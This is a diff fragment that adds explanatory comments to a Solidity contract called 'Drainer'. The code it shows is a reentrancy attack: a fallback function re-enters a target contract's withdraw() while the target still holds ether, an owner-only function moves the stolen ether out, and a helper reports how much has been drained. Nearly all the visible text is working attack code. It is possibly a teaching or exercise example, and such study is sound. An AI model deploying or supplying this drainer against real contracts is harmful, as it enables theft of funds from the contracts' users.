@@ -23,12 +23,14 @@ contract Drainer {
         target.withdraw();
     }
 
+    // main function in this attack
     fallback() external payable {
         if(address(target).balance >= 1){
             target.withdraw();
         }
     }
 
+    // send funds from this contract to the owner of the contract
     function withdrawFunds() external {
         require(msg.sender == owner, "Only owner can withdraw");
         uint256 balance = address(this).balance;
@@ -37,6 +39,7 @@ contract Drainer {
         require(sent, "Failed to send Ether");
     }
 
+    // just for checking to see how much funds is drained from the account
     function getBalance() external view returns (uint256) {
         return address(this).balance;
     }
